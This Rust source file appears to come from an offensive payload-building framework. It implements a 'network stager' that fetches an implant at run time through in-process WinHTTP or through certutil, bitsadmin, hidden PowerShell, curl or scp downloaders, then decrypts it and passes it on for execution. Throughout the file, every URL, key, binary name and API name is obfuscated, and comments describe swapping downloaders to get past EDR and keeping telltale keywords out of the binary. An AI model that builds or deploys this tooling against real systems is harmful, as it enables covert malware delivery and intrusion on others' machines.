//! Network stager (control technique).
//!
//! Fetches a payload over the network at run time instead of embedding it,
//! optionally decrypts it, and hands the bytes to the next Execution step. Two
//! transports: an in-process WinHTTP fetch (no child process, no temp file) and
//! a child downloader (`curl`/`certutil`/`powershell`/`bitsadmin`/`scp`). A
//! plan can also keep the payload embedded as a fallback
//! (`fallback: embedded`): the fetch then refreshes a payload that would run
//! without a network too — the staged/stageless switch. See `README.md` and
//! `docs/design/network-stager.md`.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;

use super::{Capability, Category, Stability, TechniqueDef};

/// Transport-level protection of the fetched payload.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum StagerCrypto {
    /// The fetched blob is used as-is.
    #[default]
    None,
    /// The fetched blob is XChaCha20-Poly1305 ciphertext, decrypted in the stub.
    XChaCha20Poly1305,
}

impl StagerCrypto {
    /// Whether the fetched blob is encrypted.
    pub fn is_encrypted(self) -> bool {
        matches!(self, StagerCrypto::XChaCha20Poly1305)
    }
}

/// What the Execution step runs when the fetch fails.
///
/// `none` (the default) is a strictly staged plan: nothing of the payload ships
/// in the artifact, so a failed fetch fails the step (subject to the declared
/// `on_fail`). `embedded` keeps the payload embedded *as well* and prefers the
/// fetched bytes: the fetch only decides which copy runs, so it cannot fail the
/// chain. That is the best of both worlds — the artifact works offline, and a
/// reachable server refreshes the payload without a rebuild.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum StagerFallback {
    /// Strictly staged: nothing of the payload ships in the artifact.
    #[default]
    None,
    /// The artifact embeds the payload; the fetch is a refresh.
    Embedded,
}

/// Which program fetches the payload.
///
/// `winhttp` fetches in-process (no child process, no temp file, no static
/// `winhttp.dll` import) and is what `auto` picks for `http(s)`. The remaining
/// transports are child processes, so an EDR that blocks one (for example
/// `certutil -urlcache`, a classic download LOLBin) may allow another. A plan
/// with an `scp://` URL always uses `scp`.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Downloader {
    /// `winhttp` for `http(s)`, `curl` for `ftp`, `scp` for `scp://` (default).
    #[default]
    Auto,
    /// In-process WinHTTP fetch (`http://`/`https://` only).
    Winhttp,
    /// `curl.exe -sL -o <out> <url>`.
    Curl,
    /// `certutil.exe -urlcache -split -f <url> <out>`.
    Certutil,
    /// A hidden `powershell -NoProfile -Command Invoke-WebRequest`.
    Powershell,
    /// `bitsadmin /transfer <job> /download <url> <out>`.
    Bitsadmin,
}

/// The default `agent` string for the in-process transport.
pub const DEFAULT_AGENT: &str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";

/// Parameters for the network-stager technique.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Params {
    /// Name of the payload this step fetches (in `build.payloads`). The payload's
    /// `format`/`export`/`args` still describe how the Execution step runs the
    /// fetched bytes; its `source` is ignored for a strictly staged payload and
    /// is what `fallback: embedded` reads.
    pub payload: String,

    /// The URL to fetch. The scheme selects the transport family at build time:
    /// `http://`/`https://`/`ftp://` use the configured `downloader`, `scp://`
    /// uses `scp`.
    pub url: String,

    /// Which transport fetches the payload (default: `auto` = in-process for
    /// `http(s)`, `curl` for `ftp`, `scp` for `scp://`).
    #[serde(default)]
    pub downloader: Downloader,

    /// What the Execution step runs when the fetch fails (default: `none`).
    #[serde(default)]
    pub fallback: StagerFallback,

    /// `User-Agent` for the in-process fetch (default:
    /// [`DEFAULT_AGENT`]). Set it when the traffic should look like something
    /// specific; the child-process transports have their own agent.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub agent: Option<String>,

    /// Whether the fetched blob is encrypted (default: `none`).
    #[serde(default)]
    pub crypto: StagerCrypto,

    /// XChaCha20 key (hex, 32 bytes); required when `crypto` is `xchacha20poly1305`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub key: Option<String>,

    /// XChaCha20 nonce (hex, 24 bytes); required when `crypto` is `xchacha20poly1305`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub nonce: Option<String>,

    /// Connect/read timeout, in milliseconds.
    #[serde(default = "default_timeout_ms")]
    pub timeout_ms: u32,

    /// Extra attempts after the first one.
    #[serde(default)]
    pub retries: u32,
}

/// Default stager timeout: 30 seconds.
pub fn default_timeout_ms() -> u32 {
    30_000
}

impl Default for Params {
    fn default() -> Self {
        Self {
            payload: String::new(),
            url: String::new(),
            downloader: Downloader::Auto,
            fallback: StagerFallback::None,
            agent: None,
            crypto: StagerCrypto::None,
            key: None,
            nonce: None,
            timeout_ms: default_timeout_ms(),
            retries: 0,
        }
    }
}

/// Static metadata for the network-stager technique.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "network_stager",
    attck: &["T1105", "T1071"],
    // Both transports compile and unit-test and a live fetch is measured over
    // loopback (2026-10-14); a real (non-loopback) deployment and `ssh` are
    // still open workstreams — see the README and
    // `docs/design/network-stager.md`.
    stability: Stability::Experimental,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    conflicts: &[],
    category: Category::Control,
    doc_path: "src/techniques/network_stager/README.md",
    readme: include_str!("README.md"),
    stub_fragment: include_str!("stub_fragment.rs"),
    formats: &[],
    requires_indirect_syscalls: false,
    params_example: "technique: network_stager\nparams:\n  payload: implant\n  url: \"https://example.invalid/implant.bin\"\n  downloader: winhttp\n",
    // The fetch is either a Win32 child process (certutil/scp/...) or a
    // dynamically resolved WinHTTP client, like `living_off_the_land`: neither
    // is a kernel call the stub issues.
    syscalls: &[],
    resolves_imports: false,
};

/// The two transport implementations. `render_fragment` splices one of them in
/// at `$TRANSPORT_CODE$`; each defines `fetch() -> Result<Vec<u8>, String>`
/// plus its private helpers, so the shared runner in `stub_fragment.rs` is
/// transport-agnostic and no dead code (an unused child-process import, an
/// unused WinHTTP alias) reaches the generated stub.
const TRANSPORT_SUBPROCESS: &str = include_str!("transport_subprocess.rs");
const TRANSPORT_WINHTTP: &str = include_str!("transport_winhttp.rs");

/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
/// pairs. Every message is keyword-free so no technique keyword (such as
/// `stager` or `loader`) reaches the generated stub's `.rdata`.
const MESSAGES: &[(&str, &str)] = &[
    ("$MSG_SPAWN_FAILED$", "could not launch the downloader"),
    ("$MSG_DOWNLOAD_FAILED$", "the downloader failed"),
    ("$MSG_TIMEOUT$", "the downloader timed out"),
    ("$MSG_READ_FAILED$", "could not read the fetched payload"),
    ("$MSG_FETCH_FAILED$", "could not fetch the payload"),
    ("$MSG_BAD_LIBRARY_NAME$", "invalid library name"),
    ("$MSG_BAD_ENTRY_NAME$", "invalid entry point name"),
    (
        "$MSG_LIBRARY_MISSING$",
        "could not load the network library",
    ),
    (
        "$MSG_ENTRY_MISSING$",
        "the network library is missing an entry point",
    ),
    (
        "$MSG_SESSION_FAILED$",
        "could not start the network session",
    ),
    ("$MSG_CONNECT_FAILED$", "could not connect to the server"),
    ("$MSG_REQUEST_FAILED$", "could not open the request"),
    ("$MSG_SEND_FAILED$", "could not send the request"),
    ("$MSG_NO_RESPONSE$", "the server did not answer"),
    ("$MSG_STATUS_FAILED$", "the server answered with status"),
    ("$MSG_BODY_FAILED$", "could not read the response body"),
];

/// The `scp` transport target (`user@host:path`), parsed from an `scp://` URL at
/// build time so the fragment never parses a scheme at run time.
fn scp_target(url: &str) -> String {
    let rest = url.strip_prefix("scp://").unwrap_or(url);
    let (hostport, path) = match rest.find('/') {
        Some(slash) => (&rest[..slash], &rest[slash + 1..]),
        None => (rest, ""),
    };
    // Drop any `:port` — it is passed as `-P <port>`, not part of `user@host:path`.
    let host = match hostport.rfind(':') {
        Some(pos) => &hostport[..pos],
        None => hostport,
    };
    format!("{host}:{path}")
}

/// The port of an `scp://[user@]host[:port]/path` URL, or empty.
fn scp_port(url: &str) -> String {
    let rest = url.strip_prefix("scp://").unwrap_or(url);
    let hostport = match rest.find('/') {
        Some(slash) => &rest[..slash],
        None => rest,
    };
    match hostport.rfind(':') {
        Some(pos) => hostport[pos + 1..].to_string(),
        None => String::new(),
    }
}

/// The pieces of an `http(s)://` URL the in-process transport needs.
///
/// Parsed at build time so the generated stub never parses a URL: it receives
/// the host, the port, the path (with its query) and the TLS flag as separate
/// values.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct HttpUrl {
    /// Host without scheme, userinfo or port (brackets stripped from an IPv6
    /// literal).
    pub host: String,
    /// Explicit port, or the scheme's default.
    pub port: u16,
    /// Path including the query, always starting with `/`.
    pub path: String,
    /// Whether the request goes over TLS (`https://`).
    pub secure: bool,
}

/// Parses an `http://`/`https://` URL for the in-process transport.
///
/// Returns a message describing the problem (surfaced by `plan::validate` and
/// by the fragment renderer's defensive path) instead of building a transport
/// that would fail on the host.
pub fn parse_http_url(url: &str) -> Result<HttpUrl, String> {
    let (secure, rest) = if let Some(rest) = url.strip_prefix("https://") {
        (true, rest)
    } else if let Some(rest) = url.strip_prefix("http://") {
        (false, rest)
    } else {
        return Err(format!("'{url}' is not an http:// or https:// URL"));
    };

    // The authority ends at the first `/` or `?`; everything after it is the
    // request target (a query without a path still gets a leading `/`).
    let (authority, path) = match rest.find(['/', '?']) {
        Some(index) => {
            let tail = &rest[index..];
            let path = if tail.starts_with('/') {
                tail.to_string()
            } else {
                format!("/{tail}")
            };
            (&rest[..index], path)
        }
        None => (rest, "/".to_string()),
    };
    // Drop the userinfo (`user:pass@`): WinHTTP has no place to put it here.
    let authority = match authority.rfind('@') {
        Some(at) => &authority[at + 1..],
        None => authority,
    };
    if authority.is_empty() {
        return Err(format!("'{url}' has no host"));
    }

    // `[::1]:8080` (IPv6 literal) or `host[:port]`.
    let (host, port_text) = if let Some(rest) = authority.strip_prefix('[') {
        let end = rest
            .find(']')
            .ok_or_else(|| format!("'{url}' has an unterminated IPv6 host"))?;
        let tail = &rest[end + 1..];
        let port = match tail.strip_prefix(':') {
            Some(port) => Some(port),
            None if tail.is_empty() => None,
            None => return Err(format!("'{url}' has trailing junk after the IPv6 host")),
        };
        (&rest[..end], port)
    } else {
        match authority.rfind(':') {
            Some(colon) => (&authority[..colon], Some(&authority[colon + 1..])),
            None => (authority, None),
        }
    };
    if host.is_empty() {
        return Err(format!("'{url}' has no host"));
    }

    let port = match port_text {
        Some(text) => text
            .parse::<u16>()
            .ok()
            .filter(|port| *port != 0)
            .ok_or_else(|| format!("'{url}' has an invalid port"))?,
        None => {
            if secure {
                443
            } else {
                80
            }
        }
    };

    Ok(HttpUrl {
        host: host.to_string(),
        port,
        path,
        secure,
    })
}

impl Params {
    /// Whether the in-process transport serves this URL.
    ///
    /// `http(s)` with `auto` or an explicit `winhttp`; `scp://` and `ftp://`
    /// always use a child process.
    fn uses_winhttp(&self) -> bool {
        let is_http = self.url.starts_with("http://") || self.url.starts_with("https://");
        is_http && matches!(self.downloader, Downloader::Auto | Downloader::Winhttp)
    }

    /// Renders the stager fragment for these parameters.
    ///
    /// The URL (or, for the in-process transport, its host/path/agent pieces),
    /// the credentials embedded in it, the crypto key/nonce, the downloader
    /// command/flag strings and every resolved WinHTTP entry point are all
    /// emitted as code that rebuilds the value at run time through `strings`,
    /// so none of them lands in cleartext. The transport is decided here at
    /// build time, so the fragment needs no scheme literals.
    pub fn render_fragment(&self, strings: &StringsConfig) -> String {
        let is_scp = self.url.starts_with("scp://");
        // 0 scp, 1 curl, 2 certutil, 3 powershell, 4 bitsadmin. Only consulted
        // by the child-process transport's code; an `scp://` URL always uses
        // scp, whatever `downloader` says.
        let downloader = if is_scp {
            0
        } else {
            match self.downloader {
                Downloader::Auto | Downloader::Curl | Downloader::Winhttp => 1,
                Downloader::Certutil => 2,
                Downloader::Powershell => 3,
                Downloader::Bitsadmin => 4,
            }
        };
        let transport_code = if self.uses_winhttp() {
            TRANSPORT_WINHTTP
        } else {
            TRANSPORT_SUBPROCESS
        };

        // A failed fetch either fails the step (strictly staged) or falls
        // through to the embedded copy (`fallback: embedded`).
        let fetch_failed = match self.fallback {
            StagerFallback::None => "return Err(e);".to_string(),
            StagerFallback::Embedded => "crate::tech_dbg!(\"network_stager\", \"the fetch failed; \
                 the embedded copy is used: {e}\");\n            return Ok(0);"
                .to_string(),
        };

        let url = strings.obfuscate(&self.url).render_stub_expr("stager_url");
        let scp_target = strings
            .obfuscate(&scp_target(&self.url))
            .render_stub_expr("scp_target");
        let scp_port = strings
            .obfuscate(&scp_port(&self.url))
            .render_stub_expr("scp_port");
        let key = strings
            .obfuscate(self.key.as_deref().unwrap_or(""))
            .render_stub_expr("stager_key");
        let nonce = strings
            .obfuscate(self.nonce.as_deref().unwrap_or(""))
            .render_stub_expr("stager_nonce");

        // The in-process transport's pieces. `parse_http_url` already ran in
        // `plan::validate` for every plan that routes here; the empty fallback
        // only keeps the renderer infallible, and an unreachable branch fails
        // in the stub with a clear message.
        let parsed = parse_http_url(&self.url).unwrap_or_else(|_| HttpUrl {
            host: String::new(),
            port: 0,
            path: "/".to_string(),
            secure: false,
        });
        let host = strings
            .obfuscate(&parsed.host)
            .render_stub_expr("winhttp_host");
        let path = strings
            .obfuscate(&parsed.path)
            .render_stub_expr("winhttp_path");
        let agent = strings
            .obfuscate(self.agent.as_deref().unwrap_or(DEFAULT_AGENT))
            .render_stub_expr("winhttp_agent");

        // Every downloader's binary name and flags and every WinHTTP entry
        // point are obfuscated. Only the chosen transport's code is spliced in,
        // but the substitutions run regardless so no placeholder survives.
        let lit = |text: &str, name: &str| strings.obfuscate(text).render_stub_expr(name);
        let bin_scp = lit("scp", "bin_scp");
        let bin_curl = lit("curl", "bin_curl");
        let bin_certutil = lit("certutil", "bin_certutil");
        let bin_powershell = lit("powershell", "bin_powershell");
        let bin_bitsadmin = lit("bitsadmin", "bin_bitsadmin");
        let arg_urlcache = lit("-urlcache", "arg_urlcache");
        let arg_split = lit("-split", "arg_split");
        let arg_f = lit("-f", "arg_f");
        let arg_o = lit("-o", "arg_o");
        let arg_strict = lit("StrictHostKeyChecking=no", "arg_strict");
        let arg_p = lit("-P", "arg_p");
        let arg_curl_silent = lit("-sL", "arg_curl_silent");
        let arg_curl_output = lit("-o", "arg_curl_output");
        let arg_ps_noprofile = lit("-NoProfile", "arg_ps_noprofile");
        let arg_ps_command = lit("-Command", "arg_ps_command");
        let ps_uri_prefix = lit("Invoke-WebRequest -UseBasicParsing -Uri '", "ps_uri_prefix");
        let ps_outfile_mid = lit("' -OutFile '", "ps_outfile_mid");
        let ps_suffix = lit("'", "ps_suffix");
        let arg_bits_transfer = lit("/transfer", "arg_bits_transfer");
        let arg_bits_job = lit("picaro", "arg_bits_job");
        let arg_bits_download = lit("/download", "arg_bits_download");
        let arg_bits_priority = lit("/priority", "arg_bits_priority");
        let arg_bits_normal = lit("normal", "arg_bits_normal");
        let winhttp_dll = lit("winhttp.dll", "winhttp_dll");
        let get_verb = lit("GET", "winhttp_verb");
        let fn_open = lit("WinHttpOpen", "fn_open");
        let fn_connect = lit("WinHttpConnect", "fn_connect");
        let fn_request = lit("WinHttpOpenRequest", "fn_request");
        let fn_timeouts = lit("WinHttpSetTimeouts", "fn_timeouts");
        let fn_set_option = lit("WinHttpSetOption", "fn_set_option");
        let fn_send = lit("WinHttpSendRequest", "fn_send");
        let fn_receive = lit("WinHttpReceiveResponse", "fn_receive");
        let fn_headers = lit("WinHttpQueryHeaders", "fn_headers");
        let fn_available = lit("WinHttpQueryDataAvailable", "fn_available");
        let fn_read = lit("WinHttpReadData", "fn_read");
        let fn_close = lit("WinHttpCloseHandle", "fn_close");

        let mut rendered = DEF
            .stub_fragment
            .replace("$TRANSPORT_CODE$", transport_code)
            .replace("$FETCH_FAILED$", &fetch_failed)
            .replace("$URL_DEF$", &url)
            .replace("$SCP_TARGET_DEF$", &scp_target)
            .replace("$SCP_PORT_DEF$", &scp_port)
            .replace("$KEY_DEF$", &key)
            .replace("$NONCE_DEF$", &nonce)
            .replace("$DOWNLOADER$", &format!("{downloader}u32"))
            .replace(
                "$CRYPTO$",
                if self.crypto.is_encrypted() {
                    "true"
                } else {
                    "false"
                },
            )
            .replace("$TIMEOUT_MS$", &format!("{}u32", self.timeout_ms))
            .replace("$RETRIES$", &format!("{}u32", self.retries))
            .replace("$WINHTTP_HOST_DEF$", &host)
            .replace("$WINHTTP_PATH_DEF$", &path)
            .replace("$WINHTTP_AGENT_DEF$", &agent)
            .replace("$WINHTTP_PORT$", &format!("{}u16", parsed.port))
            .replace(
                "$WINHTTP_SECURE$",
                if parsed.secure { "true" } else { "false" },
            )
            .replace("$GET_VERB_DEF$", &get_verb)
            .replace("$WINHTTP_DLL_DEF$", &winhttp_dll)
            .replace("$FN_OPEN_DEF$", &fn_open)
            .replace("$FN_CONNECT_DEF$", &fn_connect)
            .replace("$FN_REQUEST_DEF$", &fn_request)
            .replace("$FN_TIMEOUTS_DEF$", &fn_timeouts)
            .replace("$FN_SET_OPTION_DEF$", &fn_set_option)
            .replace("$FN_SEND_DEF$", &fn_send)
            .replace("$FN_RECEIVE_DEF$", &fn_receive)
            .replace("$FN_HEADERS_DEF$", &fn_headers)
            .replace("$FN_AVAILABLE_DEF$", &fn_available)
            .replace("$FN_READ_DEF$", &fn_read)
            .replace("$FN_CLOSE_DEF$", &fn_close)
            .replace("$BIN_SCP$", &bin_scp)
            .replace("$BIN_CURL$", &bin_curl)
            .replace("$BIN_CERTUTIL$", &bin_certutil)
            .replace("$BIN_POWERSHELL$", &bin_powershell)
            .replace("$BIN_BITSADMIN$", &bin_bitsadmin)
            .replace("$ARG_URLCACHE$", &arg_urlcache)
            .replace("$ARG_SPLIT$", &arg_split)
            .replace("$ARG_F$", &arg_f)
            .replace("$ARG_O$", &arg_o)
            .replace("$ARG_STRICT$", &arg_strict)
            .replace("$ARG_P$", &arg_p)
            .replace("$ARG_CURL_SILENT$", &arg_curl_silent)
            .replace("$ARG_CURL_OUTPUT$", &arg_curl_output)
            .replace("$ARG_PS_NOPROFILE$", &arg_ps_noprofile)
            .replace("$ARG_PS_COMMAND$", &arg_ps_command)
            .replace("$PS_URI_PREFIX$", &ps_uri_prefix)
            .replace("$PS_OUTFILE_MID$", &ps_outfile_mid)
            .replace("$PS_SUFFIX$", &ps_suffix)
            .replace("$ARG_BITS_TRANSFER$", &arg_bits_transfer)
            .replace("$ARG_BITS_JOB$", &arg_bits_job)
            .replace("$ARG_BITS_DOWNLOAD$", &arg_bits_download)
            .replace("$ARG_BITS_PRIORITY$", &arg_bits_priority)
            .replace("$ARG_BITS_NORMAL$", &arg_bits_normal);
        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
            rendered = rendered.replace(
                placeholder,
                &strings
                    .obfuscate(text)
                    .render_stub_expr(&format!("msg_{index}")),
            );
        }
        rendered
    }
}

#[cfg(test)]
mod tests;
